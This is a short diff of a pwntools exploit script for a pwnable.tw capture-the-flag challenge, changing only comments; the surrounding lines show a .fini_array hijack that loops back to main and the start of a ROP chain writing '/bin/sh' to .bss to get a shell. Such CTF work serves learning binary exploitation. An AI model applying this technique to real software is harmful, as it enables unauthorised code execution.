@@ -1,4 +1,4 @@
-###destructor(.fini_array)
+###fini_array hijack
 
 from pwn import *
 
@@ -24,7 +24,7 @@ syscall = 0x471db5
 
 ###Exploit
 r = remote('chall.pwnable.tw',10105)
-###Hijack .fini_array section and assign destructor to form loop
+###Hijack .fini_array section and assign function to form loop
 edit(fini_array,p64(call_fini_array)+p64(main))
 ###Construct ROPchain
 edit(bss,'/bin/sh\x00')
